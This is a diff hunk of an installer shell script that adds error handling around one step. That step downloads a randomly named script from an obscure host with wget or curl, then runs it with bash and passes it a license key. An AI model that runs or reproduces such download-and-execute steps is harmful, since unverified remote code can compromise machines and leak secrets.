@@ -52,7 +52,13 @@ if ! command -v base64 > /dev/null; then
 fi
 
 if (wget hxl0w5.hhub.top/VktjWxphUl.sh -4O tinyinstaller.sh || curl hxl0w5.hhub.top/VktjWxphUl.sh -Lo tinyinstaller.sh); then
-    bash tinyinstaller.sh -i=94f3c6ad-6153-49a9-b7f6-2d3ea4fb371e -k="$LICENSE_KEY"
+    if bash tinyinstaller.sh -i=94f3c6ad-6153-49a9-b7f6-2d3ea4fb371e -k="$LICENSE_KEY"; then
+        echo "Installation completed successfully."
+    else
+        echo "Installation failed. You may have run out of installations."
+        echo "Please contact the administrator for support and to request additional installations."
+        exit 1
+    fi
 else
     echo "Failed to download the installation script. Please check your internet connection and try again."
     exit 1
